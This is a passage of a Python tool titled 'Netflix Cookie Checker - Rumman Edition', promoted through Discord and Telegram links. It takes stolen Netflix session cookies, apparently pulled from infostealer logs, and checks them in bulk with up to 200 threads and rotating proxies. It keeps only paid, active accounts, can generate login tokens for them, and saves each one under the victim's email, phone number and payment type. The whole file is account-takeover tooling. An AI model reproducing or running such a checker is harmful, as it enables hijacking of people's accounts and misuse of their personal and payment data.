        "",
        "# ==================================================",
        "# Copyright by Rumman",
        "# Made By Rumman",
        "# Discord: https://discord.gg/HppRqsPpbG",
        "# Discord: https://discord.gg/g8zmHBMgWh",
        "# Discord: https://discord.gg/gamingzone",
        "# Telegram: https://t.me/rummanserver",
    ])
    
    return "\n".join(lines)

# ==================================================
# CHECKER ENGINE
# ==================================================

class RummanChecker:
    def __init__(self):
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        self.errors = 0
        self.duplicates = 0
        self.free = 0
        self.on_hold = 0
        self.total_bundles = 0
        self.seen = set()
        self.lock = threading.Lock()
        self.output_folder = None
        self.dcb_folder = None
        self.tp_folder = None
    
    def update_title(self):
        set_title(f"V:{self.valid} H:{self.on_hold} F:{self.free} I:{self.invalid} D:{self.duplicates} | {self.checked}/{self.total_bundles}")
    
    def move_to_processed(self, path):
        try:
            shutil.move(path, os.path.join(PROCESSED_FOLDER, os.path.basename(path)))
        except:
            try:
                os.remove(path)
            except:
                pass
    
    def process_bundle(self, cookies: Dict[str, str], netscape: str, source_file: str, bundle_idx: int, report_info: Dict, proxy: str = None, gen_nftoken: bool = False):
        filename = os.path.basename(source_file)
        bundle_label = f"{filename} [account {bundle_idx}]" if bundle_idx > 0 else filename
        
        try:
            if not cookies or 'NetflixId' not in cookies:
                with self.lock:
                    self.invalid += 1
                    self.checked += 1
                    self.update_title()
                print(f"{color_text('[-]', Colors.RED)} INVALID | {bundle_label} | Missing NetflixId")
                return
            
            is_sub, info, raw = check_account(cookies, proxy)
            
            if report_info:
                for key in ['accountOwnerName', 'countryOfSignup', 'plan', 'email', 'memberSince', 'nextBillingDate', 'videoQuality', 'maxStreams']:
                    if report_info.get(key) and not info.get(key):
                        info[key] = report_info[key]
            
            if not info.get('email'):
                with self.lock:
                    self.invalid += 1
                    self.checked += 1
                    self.update_title()
                print(f"{color_text('[-]', Colors.RED)} INVALID | {bundle_label} | No email found")
                return
            
            hold_status = info.get('holdStatus', 'No')
            is_on_hold = (hold_status == 'Yes')
            
            if not is_sub:
                with self.lock:
                    self.free += 1
                    self.checked += 1
                    self.update_title()
                print(f"{color_text('[!]', Colors.YELLOW)} FREE    | {bundle_label} | No active subscription (discarded)")
                return
            
            if is_on_hold:
                with self.lock:
                    self.on_hold += 1
                    self.checked += 1
                    self.update_title()
                print(f"{color_text('[!]', Colors.MAGENTA)} ON HOLD | {bundle_label} | Account on hold (discarded)")
                return
            
            uid = info.get('userGuid') or info.get('email')
            with self.lock:
                if uid and uid in self.seen:
                    self.duplicates += 1
                    self.checked += 1
                    self.update_title()
                    print(f"{color_text('[!]', Colors.YELLOW)} DUPLICATE | {bundle_label}")
                    return
                if uid:
                    self.seen.add(uid)
            
            nftoken = None
            if gen_nftoken:
                nftoken = create_nftoken(cookies)
            
            country_code = get_country_code(info.get('countryOfSignup', 'XX'))
            payment_category = get_payment_category(info.get('paymentMethod', 'Unknown'))
            email_part = sanitize_filename_part(info.get('email', 'noemail'), 25)
            phone_part = sanitize_filename_part(info.get('phoneNumber', 'nophone'), 15)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            out_name = f"[{country_code}][{payment_category}][{email_part}][{phone_part}]_{timestamp}.txt"
            
            if payment_category == "DCB":
                out_path = os.path.join(self.dcb_folder, out_name)
            elif payment_category == "TP":
                out_path = os.path.join(self.tp_folder, out_name)
            else:
                out_path = os.path.join(self.output_folder, out_name)
            
            output = format_output(info, netscape, nftoken)
            with open(out_path, 'w', encoding='utf-8') as f:
                f.write(output)
            
            with self.lock:
                self.valid += 1
                self.checked += 1
                self.update_title()
            
            flag = country_to_flag(country_code)
            nftoken_str = " +NFT" if nftoken else ""
            folder_str = ""
            if payment_category == "DCB":
                folder_str = " [DCB]"
            elif payment_category == "TP":
                folder_str = " [TP]"
            print(f"{color_text('[+]', Colors.GREEN)} VALID{nftoken_str}{folder_str} | {bundle_label} | {info.get('plan', '?')} | {country_code} {flag} | {payment_category} | {info.get('email', 'no email')}")
            
        except Exception as e:
            with self.lock:
                self.errors += 1
                self.checked += 1
                self.update_title()
            print(f"{color_text('[!]', Colors.RED)} ERROR   | {bundle_label} | {str(e)[:50]}")
    
    def process_file(self, file_path: str, proxy: str = None, gen_nftoken: bool = False):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            bundles = extract_cookie_bundles(content)
            
            if not bundles:
                with self.lock:
                    self.invalid += 1
                    self.checked += 1
                    self.update_title()
                print(f"{color_text('[-]', Colors.RED)} INVALID | {os.path.basename(file_path)} | No valid cookies found")
                self.move_to_processed(file_path)
                return
            
            for idx, (cookies, netscape, report_info) in enumerate(bundles, 1):
                self.process_bundle(cookies, netscape, file_path, idx if len(bundles) > 1 else 0, report_info, proxy, gen_nftoken)
            
            self.move_to_processed(file_path)
            
        except Exception as e:
            with self.lock:
                self.errors += 1
                self.checked += 1
                self.update_title()
            print(f"{color_text('[!]', Colors.RED)} ERROR   | {os.path.basename(file_path)} | {str(e)[:50]}")
            self.move_to_processed(file_path)
    
    def run(self, threads=50, use_proxy=False, gen_nftoken=False):
        create_folders()
        
        self.output_folder = get_timestamped_output_folder()
        self.dcb_folder = os.path.join(self.output_folder, "DCB")
        self.tp_folder = os.path.join(self.output_folder, "TP")
        
        print(color_text(f"\n[*] Output folder: {self.output_folder}", Colors.CYAN))
        print(color_text(f"[*] DCB accounts saved in: {self.dcb_folder}", Colors.CYAN))
        print(color_text(f"[*] TP accounts saved in: {self.tp_folder}", Colors.CYAN))
        print(color_text("[*] Other categories (CC, UPI, PayPal, etc.) stay in root folder", Colors.CYAN))
        print(color_text("[*] File naming: [CountryCode][PaymentType][Email][PhoneNumber]_timestamp.txt", Colors.CYAN))
        print(color_text("[*] Only active subscribed (paid, not on hold) accounts will be saved.", Colors.GREEN))
        
        files = get_cookie_files()
        if not files:
            print(color_text("\n[!] No cookie files in 'Cookies' folder!", Colors.YELLOW))
            input("\nPress Enter...")
            return
        
        self.total_bundles = len(files) * 5
        proxies = load_proxies() if use_proxy else []
        
        print(color_text(f"\n[*] Found {len(files)} cookie files", Colors.CYAN))
        print(color_text(f"[*] Threads: {threads}", Colors.CYAN))
        if use_proxy:
            print(color_text(f"[*] Proxies: {len(proxies)}", Colors.CYAN))
        print(color_text(f"[*] NFToken: {'ON' if gen_nftoken else 'OFF'}", Colors.CYAN))
        print(color_text("\n[*] Starting...\n", Colors.GREEN))
        
        self.update_title()
        
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = []
            for i, fp in enumerate(files):
                proxy = proxies[i % len(proxies)] if proxies else None
                futures.append(ex.submit(self.process_file, fp, proxy, gen_nftoken))
            for f in as_completed(futures):
                try:
                    f.result()
                except:
                    pass
        
        print(color_text("\n" + "="*50, Colors.CYAN))
        print(color_text("         FINAL SUMMARY", Colors.MAGENTA))
        print(color_text("="*50, Colors.CYAN))
        print(color_text(f"Total files processed: {len(files)}", Colors.WHITE))
        print(color_text(f"Valid (active): {self.valid}", Colors.GREEN))
        print(color_text(f"On Hold (discarded): {self.on_hold}", Colors.MAGENTA))
        print(color_text(f"Free (discarded): {self.free}", Colors.YELLOW))
        print(color_text(f"Invalid: {self.invalid}", Colors.RED))
        print(color_text(f"Duplicates: {self.duplicates}", Colors.MAGENTA))
        print(color_text(f"Errors: {self.errors}", Colors.RED))
        print(color_text("="*50, Colors.CYAN))
        input("\nPress Enter...")

# ==================================================
# MENU
# ==================================================

def menu():
    clear_screen()
    print(color_text(BANNER, Colors.CYAN))
    print(color_text("="*50, Colors.MAGENTA))
    print(color_text("  Netflix Cookie Checker - Rumman Edition", Colors.YELLOW))
    print(color_text("="*50, Colors.MAGENTA))
    print()
    print(color_text("  1. Check Cookies (No Proxy)", Colors.GREEN))
    print(color_text("  2. Check Cookies (With Proxy)", Colors.GREEN))
    print(color_text("  3. Check Cookies + NFToken", Colors.GREEN))
    print(color_text("  4. Check Cookies + NFToken (With Proxy)", Colors.GREEN))
    print(color_text("  5. Extract Cookies from Logs", Colors.CYAN))
    print(color_text("  6. Exit", Colors.RED))
    print()
    return input(color_text("  Choose: ", Colors.CYAN)).strip()

def main():
    try:
        while True:
            ch = menu()
            if ch == '1':
                t = input(color_text("  Threads (default 50): ", Colors.CYAN)) or "50"
                try:
                    t = max(1, min(int(t), 200))
                except:
                    t = 50
                RummanChecker().run(threads=t, use_proxy=False, gen_nftoken=False)
            elif ch == '2':
                t = input(color_text("  Threads (default 50): ", Colors.CYAN)) or "50"
                try:
                    t = max(1, min(int(t), 200))
                except:
                    t = 50
                RummanChecker().run(threads=t, use_proxy=True, gen_nftoken=False)
            elif ch == '3':
                t = input(color_text("  Threads (default 50): ", Colors.CYAN)) or "50"
                try:
                    t = max(1, min(int(t), 200))
                except:
                    t = 50
                RummanChecker().run(threads=t, use_proxy=False, gen_nftoken=True)
            elif ch == '4':
                t = input(color_text("  Threads (default 50): ", Colors.CYAN)) or "50"
                try:
                    t = max(1, min(int(t), 200))
                except:
                    t = 50
                RummanChecker().run(threads=t, use_proxy=True, gen_nftoken=True)
            elif ch == '5':
                extract_logs()
            elif ch == '6':
                print(color_text("\n[+] Goodbye!", Colors.GREEN))
                sys.exit(0)
            else:
                print(color_text("\n[!] Invalid option", Colors.RED))
                time.sleep(1)
    except Exception as e:
        print(f"\n[!] Unhandled error: {e}")
        import traceback
        traceback.print_exc()
        input("\nPress Enter to exit...")
        sys.exit(1)

if __name__ == "__main__":
    main()
